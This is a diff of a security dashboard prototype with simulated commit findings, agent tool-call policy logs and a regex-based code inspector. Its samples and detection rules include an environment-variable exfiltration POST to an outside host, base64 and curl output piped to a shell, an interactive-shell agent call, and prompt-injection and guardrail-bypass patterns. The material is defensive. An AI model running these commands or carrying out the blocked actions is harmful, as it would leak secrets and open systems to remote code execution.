+  </section>
+
+  </main>
+</div>
+</div>
+
+<!-- ======================= DRAWER ======================= -->
+<div class="drawer-veil" id="veil" onclick="closeDrawer()"></div>
+<aside class="drawer" id="drawer" aria-hidden="true">
+  <div class="drawer-head">
+    <h2 id="drawer-title">Commit detail</h2>
+    <button class="icon-btn" onclick="closeDrawer()" aria-label="Close">✕</button>
+  </div>
+  <div class="drawer-body" id="drawer-body"></div>
+  <div class="drawer-foot" id="drawer-foot"></div>
+</aside>
+<div class="toast-zone" id="toast-zone"></div>
+
+<script>
+'use strict';
+/* =====================================================================
+   GuardAgent Control Plane — demo build
+   Single-file prototype. All data simulated; the code inspector runs a
+   real multi-layer static heuristic engine client-side.
+   ===================================================================== */
+
+/* ---------------- simulated data ---------------- */
+const DB = {
+  kpis: [
+    {label:'Posture score', value:'82', delta:'+4 pts', up:true, spark:[71,73,72,75,74,77,78,76,79,80,79,81,80,82]},
+    {label:'Commits scanned · 7d', value:'1,284', delta:'+11%', up:true, spark:[140,155,162,148,171,180,189,176,182,190,178,195,201,188]},
+    {label:'Pipelines blocked · 7d', value:'17', delta:'-3 vs last wk', up:true, spark:[5,3,4,2,3,4,2,3,1,2,3,2,2,1], alert:false},
+    {label:'Active critical findings', value:'4', delta:'2 past SLA', up:false, alert:true, spark:[2,3,3,4,3,5,4,4,6,5,4,5,4,4]},
+  ],
+  trend: {
+    scans:[152,161,148,175,181,169,190,178,186,195,182,201,193,188],
+    blocks:[3,2,4,2,3,5,2,4,3,2,4,3,2,3],
+    reviews:[8,6,9,7,10,8,11,9,8,12,9,10,8,9],
+  },
+  postureBars: [
+    {name:'Code risk', val:78, color:'var(--accent)'},
+    {name:'Supply chain', val:71, color:'var(--warn)'},
+    {name:'Exfiltration', val:88, color:'var(--ok)'},
+    {name:'Exposure', val:64, color:'var(--crit)'},
+    {name:'AI agent risk', val:84, color:'var(--quar)'},
+    {name:'Business urgency', val:76, color:'var(--review)'},
+  ],
+  critFeed: [
+    {sev:'crit', title:'Commit blocked due to likely secret exfiltration path', meta:'payments-api · a3f92c1 · rule EXF-004 · 6 min ago'},
+    {sev:'crit', title:'Agent action denied by execution policy — shell escape attempt', meta:'deploy-agent-02 · tool:run_shell · POL-AGT-011 · 18 min ago'},
+    {sev:'warn', title:'Human review required for encoded payload in build script', meta:'ml-training-jobs · 7bd201e · rule OBF-002 · 41 min ago'},
+    {sev:'warn', title:'Patch exposure exceeds policy threshold on edge gateway', meta:'edge-gw-eu-03 · KEV CVE-2026-21771 · 1 h ago'},
+    {sev:'quar', title:'Dependency quarantined — typosquat confidence 0.94', meta:'data-platform · package "python-dateutils" · SUP-009 · 2 h ago'},
+    {sev:'ok', title:'Secret rotated and history purged — incident closed', meta:'billing-svc · GitLab PAT · MTTR 42 min · 3 h ago'},
+  ],
+  sla: [
+    {name:'Rotate exposed service token (billing-svc)', owner:'K. Osei', due:'overdue 6 h', pct:100, crit:true},
+    {name:'Patch edge-gw-eu-03 (KEV, ransomware-linked)', owner:'Infra Guild', due:'overdue 2 h', pct:100, crit:true},
+    {name:'Replace typosquatted dependency (data-platform)', owner:'M. Laurent', due:'due in 18 h', pct:72},
+    {name:'Sandbox-restore test for PostgreSQL dump', owner:'DBRE', due:'due in 2 d', pct:38},
+    {name:'Review permissive CI rule (ml-training-jobs)', owner:'S. Haddad', due:'due in 3 d', pct:22},
+  ],
+  commits: [
+    {sha:'a3f92c1', repo:'payments-api', branch:'feat/refund-flow', author:'j.moreau', threat:'Secret exfiltration', sev:'critical', conf:0.97, decision:'Block', age:'6 min',
+     files:['app/services/refund.py','app/utils/net.py'],
+     summary:'The diff introduces a function that reads os.environ in bulk and POSTs a JSON payload to an unregistered external domain (hxxps://metrics-relay[.]dev). The call is wrapped in a broad try/except that silences failures — a classic quiet-exfiltration pattern.',
+     rules:['EXF-004 env-bulk-read + external POST','NET-002 unregistered egress domain','ERR-007 silenced exception around network I/O'],
+     mitre:['T1552.001 Unsecured Credentials: In Files','T1041 Exfiltration Over C2 Channel','T1027 Obfuscated Files or Information'],
+     diff:`+ import requests, os, json
++
++ def _push_metrics():
++     data = {k: v for k, v in os.environ.items()}
++     try:
++         requests.post("https://metrics-relay.dev/v1/ingest",
++                       data=json.dumps(data), timeout=3)
++     except Exception:
++         pass`,
+     actions:['Block merge','Quarantine branch','Open incident','Notify author']},
+    {sha:'7bd201e', repo:'ml-training-jobs', branch:'main', author:'ci-bot', threat:'Obfuscated payload', sev:'high', conf:0.88, decision:'Review', age:'41 min',
+     files:['scripts/bootstrap.sh'],
+     summary:'A base64 blob is decoded and piped to sh during container bootstrap. Decoded content resolves to a curl download from a raw gist followed by chmod +x. Could be a legitimate but unsafe install pattern — human review required for encoded payload.',
+     rules:['OBF-002 base64-decode piped to shell','SUP-014 remote script execution at build time'],
+     mitre:['T1059.004 Command and Scripting Interpreter: Unix Shell','T1140 Deobfuscate/Decode Files'],
+     diff:`+ PAYLOAD="Y3VybCAtcyBodHRwczovL2dpc3QuLi4gfCBiYXNoCg=="
++ echo "$PAYLOAD" | base64 -d | sh`,
+     actions:['Request human review','Block until approved','Trace artifact']},
+    {sha:'c119f04', repo:'data-platform', branch:'feat/etl-retry', author:'m.laurent', threat:'Dependency risk', sev:'high', conf:0.94, decision:'Quarantine', age:'2 h',
+     files:['requirements.txt'],
+     summary:'requirements.txt adds "python-dateutils==2.9.1" — a known typosquat of python-dateutil. Package registry telemetry shows the squatted name publishing a post-install hook contacting a paste service. Dependency quarantined pending replacement.',
+     rules:['SUP-009 typosquat lexical distance ≤ 2','SUP-003 post-install network activity (registry intel)'],
+     mitre:['T1195.002 Supply Chain Compromise: Software Supply Chain'],
+     diff:`  pandas==2.2.3
+- python-dateutil==2.9.0
++ python-dateutils==2.9.1
+  sqlalchemy==2.0.35`,
+     actions:['Quarantine dependency','Suggest safe package','Notify owner']},
+    {sha:'e88d3a7', repo:'billing-svc', branch:'hotfix/webhook-retry', author:'k.osei', threat:'Hardcoded secret', sev:'critical', conf:0.99, decision:'Block', age:'3 h',
+     files:['app/config.py'],
+     summary:'A GitLab personal access token (glpat-…) was committed in plaintext in config.py. Token scope includes api + write_repository. Commit blocked at pre-receive; rotation runbook triggered automatically.',
+     rules:['SEC-001 GitLab PAT signature','SEC-020 credential in config file'],
+     mitre:['T1552.001 Unsecured Credentials: In Files'],
+     diff:`- GITLAB_TOKEN = os.environ["GITLAB_TOKEN"]
++ GITLAB_TOKEN = "glpat-DEMO12345FAKE000"`,
+     actions:['Rotate token','Purge history','Close incident'], resolved:true},
+    {sha:'f2a61b9', repo:'auth-gateway', branch:'feat/session-cache', author:'s.haddad', threat:'Unsafe deserialization', sev:'medium', conf:0.81, decision:'Review', age:'5 h',
+     files:['gateway/session.py'],
+     summary:'Session payloads from Redis are deserialized with pickle.loads. If cache write access is ever compromised, this becomes remote code execution. Recommend msgpack or JSON with schema validation.',
+     rules:['DES-001 pickle.loads on external data'],
+     mitre:['T1055 Process Injection (post-exploitation vector)'],
+     diff:`+ session = pickle.loads(redis.get(f"sess:{sid}"))`,
+     actions:['Request refactor','Accept with exception','Add compensating control']},
+    {sha:'91c47d2', repo:'infra-modules', branch:'feat/eks-upgrade', author:'infra-guild', threat:'CI policy weakening', sev:'medium', conf:0.77, decision:'Review', age:'8 h',
+     files:['.gitlab-ci.yml'],
+     summary:'Security scan job changed to allow_failure: true and runs only on schedules. This silently removes the security gate from the merge path. Flagged as policy drift rather than malicious intent.',
+     rules:['CIP-005 security job made non-blocking','CIP-011 gate removed from MR pipeline'],
+     mitre:['T1562.001 Impair Defenses: Disable or Modify Tools'],
+     diff:`  security-scan:
+    stage: test
++   allow_failure: true
++   rules:
++     - if: $CI_PIPELINE_SOURCE == "schedule"`,
+     actions:['Restore gate','Escalate to platform team']},
+    {sha:'4de09cc', repo:'notify-worker', branch:'feat/i18n', author:'a.benali', threat:'None detected', sev:'low', conf:0.99, decision:'Allow', age:'9 h',
+     files:['worker/i18n/fr.json','worker/i18n/de.json'],
+     summary:'Translation resource files only. No executable content, no secrets, no dependency changes. Auto-allowed under fast-path policy FP-002.',
+     rules:['FP-002 static asset fast-path'], mitre:[],
+     diff:`+ "invoice.reminder.subject": "Rappel de facture",
++ "invoice.reminder.subject_de": "Zahlungserinnerung"`,
+     actions:['—']},
+    {sha:'b7e3f18', repo:'edge-tools', branch:'feat/diag-cli', author:'j.moreau', threat:'Dynamic execution', sev:'high', conf:0.86, decision:'Block', age:'11 h',
+     files:['cli/diag.py'],
+     summary:'User-supplied expression is passed straight into eval() for a "calculator" feature of the diagnostics CLI. Direct arbitrary-code-execution primitive; blocked pending safe expression parser.',
+     rules:['INJ-003 eval on user input','INJ-001 dynamic execution primitive'],
+     mitre:['T1059.006 Command and Scripting Interpreter: Python'],
+     diff:`+ def calc(expr: str):
++     return eval(expr)   # quick maths helper`,
+     actions:['Block merge','Suggest ast.literal_eval','Notify author']},
+  ],
+  pipelines: [
+    {name:'payments-api › feat/refund-flow', id:'#48122', trigger:'push a3f92c1 · j.moreau', status:'blocked',
+     stages:[['build','passed'],['unit','passed'],['sast','blocked'],['deps','pending'],['deploy','pending']],
+     reason:'<b>Blocked at AI Security Gate.</b> Rule EXF-004: bulk os.environ read followed by POST to unregistered domain. Model confidence 0.97. Unblock path: remove egress call or register domain with security review SR-2214.'},
+    {name:'ml-training-jobs › main', id:'#48119', trigger:'push 7bd201e · ci-bot', status:'review',
+     stages:[['build','passed'],['unit','passed'],['sast','warned'],['deps','passed'],['deploy','review']],
+     reason:'<b>Human review required.</b> Encoded payload decoded to remote script execution in bootstrap. Reviewer assigned: s.haddad. SLA: 4 h remaining.'},
+    {name:'data-platform › feat/etl-retry', id:'#48103', trigger:'MR !412 · m.laurent', status:'quarantined',
+     stages:[['build','passed'],['unit','passed'],['sast','passed'],['deps','quarantined'],['deploy','pending']],
+     reason:'<b>Dependency quarantined.</b> "python-dateutils" flagged as typosquat (lexical distance 1, registry intel: post-install egress). Artifact cached in quarantine store, never entered the build.'},
+    {name:'billing-svc › hotfix/webhook-retry', id:'#48097', trigger:'push e88d3a7 · k.osei', status:'passed',
+     stages:[['build','passed'],['unit','passed'],['sast','passed'],['deps','passed'],['deploy','passed']],
+     reason:'<b>Recovered.</b> Earlier commit blocked for hardcoded GitLab PAT; token rotated, history purged, follow-up commit clean. Gate reopened automatically after rotation evidence attached.'},
+    {name:'auth-gateway › feat/session-cache', id:'#48090', trigger:'MR !388 · s.haddad', status:'warned',
+     stages:[['build','passed'],['unit','passed'],['sast','warned'],['deps','passed'],['deploy','passed']],
+     reason:'<b>Deployed with warning.</b> pickle deserialization accepted under exception EX-091 (compensating control: Redis ACL + network policy). Exception expires 2026-08-15 — refactor tracked in REM-1108.'},
+    {name:'edge-tools › feat/diag-cli', id:'#48084', trigger:'push b7e3f18 · j.moreau', status:'blocked',
+     stages:[['build','passed'],['unit','warned'],['sast','blocked'],['deps','pending'],['deploy','pending']],
+     reason:'<b>Blocked at AI Security Gate.</b> eval() on user-controlled input (INJ-003). Suggested fix pushed as patch suggestion: ast.literal_eval with operator whitelist.'},
+  ],
+  agentKpis: [
+    {label:'Tool calls evaluated · 24h', value:'3,412', delta:'+9%', up:true, spark:[280,310,290,340,360,330,380,350,370,390,360,400,410,395]},
+    {label:'Denied operations', value:'23', delta:'0.67% of calls', up:true, spark:[2,1,3,2,1,2,3,1,2,2,3,2,1,2]},
+    {label:'Sandboxed executions', value:'188', delta:'+14%', up:true, spark:[12,14,13,16,15,17,14,18,16,19,17,20,18,19]},
+    {label:'Awaiting human approval', value:'2', delta:'oldest: 12 min', up:false, alert:true, spark:[1,0,2,1,1,3,2,1,2,1,2,3,2,2]},
+  ],
+  agentActions: [
+    {agent:'deploy-agent-02', action:'Roll back prod deployment', tool:'k8s.rollout_undo', risk:0.31, policy:'ALLOW · scoped namespace', outcome:'Executed', cls:'b-ok'},
+    {agent:'code-review-agent', action:'Post review comment on MR !412', tool:'gitlab.mr_comment', risk:0.05, policy:'ALLOW · read+comment scope', outcome:'Executed', cls:'b-ok'},
+    {agent:'deploy-agent-02', action:'Open shell on prod node', tool:'run_shell("bash -i")', risk:0.96, policy:'DENY · POL-AGT-011 no interactive shell', outcome:'Denied', cls:'b-crit'},
+    {agent:'remediation-agent', action:'Rotate leaked GitLab PAT', tool:'vault.rotate_secret', risk:0.42, policy:'ALLOW · with audit artifact', outcome:'Executed', cls:'b-ok'},
+    {agent:'data-sync-agent', action:'Export table to external bucket', tool:'s3.put_object(ext)', risk:0.89, policy:'ESCALATE · cross-boundary egress', outcome:'Awaiting approval', cls:'b-med'},
+    {agent:'triage-agent', action:'Auto-close finding as false positive', tool:'findings.close', risk:0.58, policy:'SANDBOX · shadow-mode first', outcome:'Sandboxed', cls:'b-quar'},
+    {agent:'ci-fix-agent', action:'Commit patch to protected branch', tool:'gitlab.commit(main)', risk:0.74, policy:'DENY · protected ref requires human', outcome:'Denied', cls:'b-crit'},
+  ],
+  agentTimeline: [
+    {t:'14:52:09', cls:'t-deny', txt:'<b>deploy-agent-02</b> requested <span class="mono">run_shell("bash -i")</span> — denied by POL-AGT-011. Session risk raised to HIGH, agent moved to constrained context.'},
+    {t:'14:47:31', cls:'t-appr', txt:'<b>data-sync-agent</b> export to external bucket escalated to human approval (cross-boundary egress, risk 0.89).'},
+    {t:'14:40:12', cls:'t-ok', txt:'<b>remediation-agent</b> rotated leaked PAT via vault. Evidence artifact EV-88412 attached automatically.'},
+    {t:'14:31:55', cls:'t-warn', txt:'<b>triage-agent</b> attempted bulk-close of 14 findings — throttled, moved to shadow mode for review.'},
+    {t:'14:22:03', cls:'t-ok', txt:'<b>code-review-agent</b> completed policy-compliant review of MR !412 (3 comments, 0 privileged calls).'},
+  ],
+  deniedOps: [
+    {op:'run_shell (interactive)', n:6}, {op:'commit to protected ref', n:5}, {op:'read secret outside scope', n:4},
+    {op:'external egress (unregistered)', n:4}, {op:'delete audit records', n:2}, {op:'modify own policy file', n:2},
+  ],
+  expKpis: [
+    {label:'Internet-facing assets', value:'34', delta:'2 unmanaged', up:false, spark:[30,31,31,32,32,33,33,33,34,34,33,34,34,34]},
+    {label:'Open KEV vulnerabilities', value:'3', delta:'1 ransomware-linked', up:false, alert:true, spark:[5,5,4,4,4,3,4,3,3,4,3,3,3,3]},
+    {label:'Median patch age (edge)', value:'19 d', delta:'policy max: 14 d', up:false, alert:true, spark:[9,10,12,11,13,14,15,14,16,17,18,18,19,19]},
+    {label:'Backups verified · 30d', value:'92%', delta:'2 restore tests failed', up:false, spark:[97,96,97,95,96,94,95,93,94,92,93,92,92,92]},
+  ],
+  expServices: [
+    {name:'edge-gw-eu-03 · 443/tcp (nginx 1.24)', risk:92, note:'KEV CVE-2026-21771 · ransomware-linked · patch overdue'},
+    {name:'vpn-hub-01 · 500/udp (IKEv2)', risk:61, note:'firmware 2 minor versions behind'},
+    {name:'git.corp · 22/tcp (sshd)', risk:34, note:'key-only auth, fail2ban active'},
+    {name:'api.pay.example · 443/tcp', risk:22, note:'WAF + mTLS, clean scan'},
+    {name:'legacy-ftp-01 · 21/tcp', risk:88, note:'unmanaged asset — decommission ticket INFRA-2291 open 47 d'},
+  ],
+  kev: [
+    {cve:'CVE-2026-21771', asset:'edge-gw-eu-03', tag:'ransomware-linked', sev:'crit', note:'Exploited in the wild; patch window exceeded by 5 days.'},
+    {cve:'CVE-2026-11042', asset:'vpn-hub-01', tag:'KEV', sev:'high', note:'Auth bypass; vendor fix available, maintenance window Friday.'},
+    {cve:'CVE-2025-48619', asset:'ci-runner-pool', tag:'KEV', sev:'med', note:'Container escape; mitigated by seccomp profile, patch queued.'},
+  ],
+  patch: [
+    {name:'Edge gateways', pct:58, color:'var(--crit)'},
+    {name:'K8s worker nodes', pct:91, color:'var(--ok)'},
+    {name:'Hypervisors (ESXi/PVE)', pct:74, color:'var(--warn)'},
+    {name:'CI runners', pct:88, color:'var(--ok)'},
+    {name:'Developer endpoints', pct:81, color:'var(--warn)'},
+  ],
+  backup: [
+    {name:'PostgreSQL prod cluster', status:'Restore test FAILED in sandbox — dump integrity mismatch', cls:'b-crit', detail:'Last good verified restore: 9 days ago. Escalated to DBRE, NIST Recover.'},
+    {name:'Object storage (payments)', status:'Verified · immutable · 4h RPO', cls:'b-ok', detail:'Cross-region replica healthy, last restore test 2 days ago.'},
+    {name:'GitLab instance', status:'Verified · daily + geo-replica', cls:'b-ok', detail:'Restore drill passed 6 days ago (RTO 38 min).'},
+    {name:'Vault (secrets)', status:'Snapshot OK — restore drill overdue', cls:'b-med', detail:'Policy requires quarterly drill; last drill 4 months ago.'},
+  ],
+  nistFns: [
+    {code:'GV', name:'Govern', score:74, open:5},
+    {code:'ID', name:'Identify', score:81, open:3},
+    {code:'PR', name:'Protect', score:69, open:7},
+    {code:'DE', name:'Detect', score:88, open:2},
+    {code:'RS', name:'Respond', score:83, open:2},
+    {code:'RC', name:'Recover', score:61, open:4},
+  ],
+  nistRows: [
+    {finding:'GitLab PAT committed in billing-svc', fn:'Protect', cat:'PR.AA — Identity & credentials', owner:'K. Osei', sla:'closed (42 min)', evidence:'EV-88412', status:'Resolved', cls:'b-ok'},
+    {finding:'Env exfiltration path in payments-api', fn:'Detect / Respond', cat:'DE.CM — Continuous monitoring', owner:'J. Moreau', sla:'4 h remaining', evidence:'EV-88437', status:'Blocked at gate', cls:'b-crit'},
+    {finding:'Critical patch debt on edge-gw-eu-03', fn:'Govern / Protect', cat:'GV.RM — Risk management', owner:'Infra Guild', sla:'overdue 5 d', evidence:'EV-88301', status:'Escalated', cls:'b-crit'},
+    {finding:'Typosquatted dependency (data-platform)', fn:'Identify', cat:'ID.SC — Supply chain', owner:'M. Laurent', sla:'18 h remaining', evidence:'EV-88420', status:'Quarantined', cls:'b-quar'},
+    {finding:'PostgreSQL restore test failure', fn:'Recover', cat:'RC.RP — Recovery planning', owner:'DBRE Team', sla:'2 d remaining', evidence:'EV-88399', status:'In progress', cls:'b-med'},
+    {finding:'Weak admin account on legacy-ftp-01', fn:'Protect', cat:'PR.AA — Identity & credentials', owner:'IT Ops', sla:'3 d remaining', evidence:'—', status:'Exception requested', cls:'b-med'},
+    {finding:'CI security gate made non-blocking', fn:'Govern', cat:'GV.PO — Policy', owner:'S. Haddad', sla:'3 d remaining', evidence:'EV-88408', status:'Under review', cls:'b-med'},
+    {finding:'pickle deserialization in auth-gateway', fn:'Protect', cat:'PR.PS — Platform security', owner:'S. Haddad', sla:'exception EX-091 to 2026-08-15', evidence:'EV-88355', status:'Exception granted', cls:'b-neutral'},
+  ],
+  audit: [
+    {ts:'2026-07-07 14:52:09Z', trig:'agent tool call', subj:'deploy-agent-02 · run_shell', policy:'POL-AGT-011', decision:'Denied', approver:'— (automatic)', ev:'EV-88441'},
+    {ts:'2026-07-07 14:48:00Z', trig:'webhook push', subj:'payments-api @ a3f92c1', policy:'EXF-004 / NET-002', decision:'Blocked', approver:'— (automatic)', ev:'EV-88437'},
+    {ts:'2026-07-07 14:13:22Z', trig:'webhook push', subj:'ml-training-jobs @ 7bd201e', policy:'OBF-002', decision:'Human review', approver:'s.haddad (pending)', ev:'EV-88431'},
+    {ts:'2026-07-07 12:40:12Z', trig:'agent remediation', subj:'vault PAT rotation (billing-svc)', policy:'REM-RUNBOOK-04', decision:'Executed', approver:'k.osei', ev:'EV-88412'},
+    {ts:'2026-07-07 12:02:51Z', trig:'MR pipeline', subj:'data-platform !412', policy:'SUP-009', decision:'Quarantined', approver:'— (automatic)', ev:'EV-88420'},
+    {ts:'2026-07-07 11:31:07Z', trig:'webhook push', subj:'billing-svc @ e88d3a7', policy:'SEC-001', decision:'Blocked → resolved', approver:'k.osei', ev:'EV-88410'},
+    {ts:'2026-07-07 09:58:44Z', trig:'exposure scan', subj:'edge-gw-eu-03 · CVE-2026-21771', policy:'EXP-KEV-01', decision:'Escalated', approver:'ciso-office', ev:'EV-88301'},
+    {ts:'2026-07-07 08:12:30Z', trig:'MR pipeline', subj:'auth-gateway !388', policy:'DES-001 + EX-091', decision:'Allowed w/ exception', approver:'ciso-office', ev:'EV-88355'},
+    {ts:'2026-07-06 22:47:18Z', trig:'backup drill', subj:'PostgreSQL prod restore (sandbox)', policy:'RC-DRILL-02', decision:'Failed — task opened', approver:'— (automatic)', ev:'EV-88399'},
+  ],
+};
+
+/* ---------------- samples for the inspector ---------------- */
+const SAMPLES = {
+exfil:`import os, json, requests
+
+def sync_config():
+    # collect runtime configuration
+    blob = {k: v for k, v in os.environ.items()}
+    payload = json.dumps(blob)
+    try:
+        requests.post("https://metrics-relay.dev/v1/ingest", data=payload, timeout=3)
+    except Exception:
+        pass
+
+API_KEY = "sk_live_9x2PqL8vRn4TzWm1Kc7B"
+eval(input("debug> "))`,
+typosquat:`# requirements.txt
+fastapi==0.115.0
+pandas==2.2.3
+python-dateutils==2.9.1
+reqeusts==2.31.0
+sqlalchemy==2.0.35`,
+docker:`FROM ubuntu:latest
+USER root
+ADD https://raw.githubusercontent.com/example/tools/main/setup.sh /setup.sh
+RUN chmod 777 /setup.sh && /setup.sh
+RUN curl -s https://get.example.dev | bash
+ENV GITLAB_TOKEN=glpat-DEMO12345FAKE000
+EXPOSE 22`,
+ci:`stages: [build, test, deploy]
+
+security-scan:
+  stage: test
+  script: [guardagent scan --diff]
+  allow_failure: true
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "schedule"
+
+deploy:
+  stage: deploy
+  script:
+    - echo "$PAYLOAD" | base64 -d | sh
+  when: always`,
+clean:`from datetime import date
+
+def days_until(target: date) -> int:
+    """Return whole days between today and target date."""
+    return (target - date.today()).days
+
+def format_badge(n: int) -> str:
+    return f"{n} day{'s' if n != 1 else ''} remaining"`,
+};
+
+/* =====================================================================
+   ANALYZER — real client-side multi-layer heuristics
+   ===================================================================== */
+const RULES = [
+ {id:'SEC-001', cat:'code', name:'GitLab personal access token', sev:'critical', w:35,
+  re:/glpat-[0-9A-Za-z_\-]{16,}/, desc:'A GitLab PAT is embedded in the content. Treat as compromised: rotate immediately and purge history.'},
+ {id:'SEC-002', cat:'code', name:'AWS access key', sev:'critical', w:35,
+  re:/AKIA[0-9A-Z]{16}/, desc:'AWS access key ID detected. Rotate the key pair and audit CloudTrail for usage.'},
+ {id:'SEC-003', cat:'code', name:'Generic API secret assignment', sev:'high', w:22,
+  re:/(?:api[_-]?key|secret|token|passwd|password)\s*[:=]\s*["'][A-Za-z0-9_\-\/+]{12,}["']/i, desc:'A high-entropy literal is assigned to a credential-named variable. Move to a secret manager.'},
+ {id:'SEC-004', cat:'code', name:'Stripe live secret key', sev:'critical', w:35,
+  re:/sk_live_[0-9A-Za-z]{16,}/, desc:'Stripe live-mode secret key found. Rotation required; payment scope exposure.'},
+ {id:'INJ-003', cat:'code', name:'eval/exec on dynamic input', sev:'critical', w:30,
+  re:/\b(?:eval|exec)\s*\(\s*(?:input|request|args|params|data|expr|payload|f["'])/i, desc:'Dynamic execution primitive fed by external input — direct arbitrary code execution path.'},
+ {id:'INJ-001', cat:'code', name:'Dynamic execution primitive', sev:'high', w:16,
+  re:/\b(?:eval|exec)\s*\(/, desc:'eval()/exec() present. Even with static input this is a fragile pattern; prefer ast.literal_eval or explicit dispatch.'},
+ {id:'DES-001', cat:'code', name:'Unsafe deserialization', sev:'high', w:20,
+  re:/pickle\.loads?\s*\(|yaml\.load\s*\((?![^)]*SafeLoader)|marshal\.loads/, desc:'Deserialization of untrusted data (pickle / yaml.load without SafeLoader) can lead to remote code execution.'},
+ {id:'OBF-002', cat:'exfil', name:'Encoded payload piped to shell', sev:'critical', w:32,
+  re:/base64\s+(?:-d|--decode)[^\n]*\|\s*(?:ba)?sh|echo\s+["'][A-Za-z0-9+\/=]{24,}["']\s*\|/, desc:'Base64 content is decoded and executed. Classic staged-payload delivery; requires human review at minimum.'},
+ {id:'OBF-004', cat:'exfil', name:'Suspicious encoded blob', sev:'medium', w:10,
+  re:/["'][A-Za-z0-9+\/]{40,}={0,2}["']/, desc:'Long base64-like literal found. Verify contents; encoded payloads are a common obfuscation vector.'},
+ {id:'EXF-004', cat:'exfil', name:'Environment bulk-read + external send', sev:'critical', w:34,
+  test:(s)=>/os\.environ(?:\.items\(\)|\[|\.get)/.test(s) && /requests\.(?:post|put|get)|urllib|httpx|fetch\s*\(|curl\s+/i.test(s),
+  desc:'Code reads environment variables and performs outbound network calls in the same unit — a likely secret exfiltration path.'},
+ {id:'NET-002', cat:'exfil', name:'Hardcoded external egress endpoint', sev:'medium', w:12,
+  re:/https?:\/\/(?!localhost|127\.0\.0\.1|(?:[a-z0-9-]+\.)*(?:example\.com|corp|internal))[a-z0-9.-]+\.(?:dev|xyz|top|io|cc|link)\b/i,
+  desc:'Outbound endpoint on a low-reputation or unregistered TLD. Register egress domains with security review.'},
+ {id:'ERR-007', cat:'code', name:'Silenced exception around I/O', sev:'medium', w:8,
+  re:/except\s+(?:Exception|BaseException)?\s*:\s*\n?\s*pass/, desc:'Broad except/pass hides failures — frequently paired with quiet exfiltration or unstable behaviour.'},
+ {id:'SUP-009', cat:'supply', name:'Typosquatted package name', sev:'critical', w:30,
+  test:(s)=>{const squats=['python-dateutils','reqeusts','urlib3','beutifulsoup4','djago','flaskk','numpi','pandass','crypto-utils-py','discord-py-slash'];
+    const hits=squats.filter(p=>new RegExp('(^|\\n)\\s*'+p.replace(/[-]/g,'[-]')+'\\b','i').test(s));
+    return hits.length?hits.join(', '):false;},
+  desc:'Package name is lexically adjacent to a popular library — high-confidence typosquat. Replace with the canonical package.'},
+ {id:'SUP-014', cat:'supply', name:'Remote script executed at build time', sev:'high', w:22,
+  re:/curl[^\n|]*\|\s*(?:ba)?sh|wget[^\n|]*\|\s*(?:ba)?sh|ADD\s+https?:\/\//i, desc:'Build fetches and executes remote content. Pin, vendor and checksum third-party install scripts.'},
+ {id:'DOC-003', cat:'supply', name:'Fragile Docker base / privileges', sev:'medium', w:10,
+  re:/FROM\s+\S+:latest|USER\s+root|chmod\s+777|--privileged/, desc:'Unpinned base image, root user or world-writable permissions weaken container supply-chain integrity.'},
+ {id:'DOC-007', cat:'exposure', name:'SSH exposed from container', sev:'medium', w:9,
+  re:/EXPOSE\s+22\b/, desc:'Container exposes SSH — expand of attack surface that gates should question.'},
+ {id:'CIP-005', cat:'cipolicy', name:'Security job made non-blocking', sev:'high', w:20,
+  re:/allow_failure:\s*true/, desc:'A pipeline job tolerates failure. If this is the security gate, the control is silently disabled.'},
+ {id:'CIP-009', cat:'cipolicy', name:'Unconditional job execution', sev:'medium', w:8,
+  re:/when:\s*always/, desc:'"when: always" runs regardless of upstream failures — verify this cannot ship unverified artifacts.'},
+ {id:'AGT-002', cat:'agent', name:'Prompt-injection marker', sev:'high', w:18,
+  re:/ignore (?:all )?(?:previous|prior|above) instructions|disregard (?:your|the) (?:system|previous) prompt/i,
+  desc:'Content carries instruction-override language targeting an AI agent — indirect prompt injection vector.'},
+ {id:'AGT-005', cat:'agent', name:'Agent self-privilege language', sev:'medium', w:10,
+  re:/(?:disable|bypass|remove).{0,24}(?:guardrail|safety|policy|sandbox)/i, desc:'Content requests weakening of agent guardrails or sandbox policy.'},
+];
+
+const CATS = [
+  ['code','Code risk'],['supply','Supply chain'],['exfil','Exfiltration'],
+  ['exposure','Exposure'],['agent','AI agent risk'],['cipolicy','CI policy'],
+];
+
+function analyze(src){
+  const findings=[];
+  const lines=src.split('\n');
+  for(const r of RULES){
+    if(r.test){
+      const res=r.test(src);
+      if(res) findings.push({...r, line:null, snippet:typeof res==='string'?res:null});
+    } else {
+      for(let i=0;i<lines.length;i++){
+        const m=lines[i].match(r.re);
+        if(m){ findings.push({...r, line:i+1, snippet:m[0].slice(0,90)}); break; }
+      }
+    }
+  }
+  // de-dup: INJ-001 subsumed by INJ-003
+  if(findings.some(f=>f.id==='INJ-003')){
+    const i=findings.findIndex(f=>f.id==='INJ-001'); if(i>-1)findings.splice(i,1);
+  }
+  const catScore={}; CATS.forEach(([c])=>catScore[c]=0);
+  findings.forEach(f=>catScore[f.cat]=Math.min(100,catScore[f.cat]+f.w*2.2));
+  const total=Math.min(100,findings.reduce((a,f)=>a+f.w,0));
+  const nCrit=findings.filter(f=>f.sev==='critical').length;
+  const nHigh=findings.filter(f=>f.sev==='high').length;
+  let decision, why;
+  if(nCrit>=2 || (nCrit>=1 && findings.some(f=>f.cat==='supply'&&f.sev==='critical'))){
+    decision='Quarantine'; why='Multiple critical signals including supply-chain or exfiltration class — artifact must not enter any build until replaced and reviewed.';
+  } else if(nCrit>=1 || total>=55){
+    decision='Block'; why='At least one critical finding (or composite risk ≥ 55) — merge blocked pending remediation.';
+  } else if(nHigh>=1 || total>=25){
+    decision='Review'; why='High-severity or accumulated medium findings — human review required before merge.';
+  } else {
+    decision='Allow'; why=findings.length?'Only low-impact hygiene findings — allowed with annotations.':'No detections across all analysis layers — allowed under fast-path policy.';
+  }
+  return {findings, catScore, total, decision, why};
+}
+
+/* =====================================================================
+   RENDERING
+   ===================================================================== */
+const $=q=>document.querySelector(q);
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+
+function spark(vals,color,w=88,h=30){
+  const min=Math.min(...vals),max=Math.max(...vals),rng=(max-min)||1;
+  const pts=vals.map((v,i)=>`${(i/(vals.length-1)*w).toFixed(1)},${(h-3-((v-min)/rng)*(h-8)).toFixed(1)}`).join(' ');
+  return `<svg width="${w}" height="${h}"><polyline points="${pts}" fill="none" stroke="${color}" stroke-width="1.6" stroke-linejoin="round"/></svg>`;
+}
+
+function kpiCard(k){
+  return `<div class="kpi${k.alert?' alert':''}">
+    <div class="k-label">${k.label}</div>
